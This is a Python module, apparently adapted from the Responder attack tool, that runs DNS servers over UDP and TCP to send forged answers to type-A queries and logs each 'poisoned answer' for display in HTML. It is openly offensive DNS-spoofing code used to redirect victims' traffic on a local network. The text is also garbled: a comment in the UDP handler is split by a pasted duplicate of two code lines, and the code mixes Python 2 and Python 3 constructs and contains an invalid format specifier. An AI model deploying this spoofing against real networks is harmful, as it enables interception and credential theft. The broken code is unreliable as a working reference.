from packets import DNS_Ans
from SocketServer import BaseRequestHandler
from utils import *
import re

# This variable will collect all the output for HTML rendering
output_data = []

def ParseDNSType(data):
    QueryTypeClass = data[len(data)-4:]

    # If Type A, Class IN, then answer.
    return QueryTypeClass == "\x00\x01\x00\x01"


class DNS(BaseRequestHandler):
    def handle(self):
        global output_data
        output_data = []  # Reset the output data each time

        # Break out if we        global output_data
        output_data = []  # Reset the output data each time don't want to respond to this host
        if RespondToThisIP(self.client_address[0]) is not True:
            return None

        try:
            data, soc = self.request

            if ParseDNSType(data) and settings.Config.AnalyzeMode == False:
                buff = DNS_Ans()
                buff.calculate(data)
                soc.sendto(str(buff), self.client_address)

                ResolveName = re.sub(r'[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
                # Capture the output for rendering in HTML
                result = f"[*] [DNS] Poisoned answer sent to: {self.client_address[0]:-15s}  Requested name: {ResolveName}"
                output_data.append(result)

        except Exception as e:
            output_data.append(f"Error in DNS handle: {e}")

        return output_data


# DNS Server TCP Class
class DNSTCP(BaseRequestHandler):
    def handle(self):
        global output_data
        output_data = []  # Reset the output data each time

        # Break out if we don't want to respond to this host
        if RespondToThisIP(self.client_address[0]) is not True:
            return None

        try:
            data = self.request.recv(1024)

            if ParseDNSType(data) and settings.Config.AnalyzeMode is False:
                buff = DNS_Ans()
                buff.calculate(data)
                self.request.send(str(buff))

                ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
                # Capture the output for rendering in HTML
                result = f"[*] [DNS-TCP] Poisoned answer sent to: {self.client_address[0]:-15s}  Requested name: {ResolveName}"
                output_data.append(result)

        except Exception as e:
            output_data.append(f"Error in DNSTCP handle: {e}")

        return output_data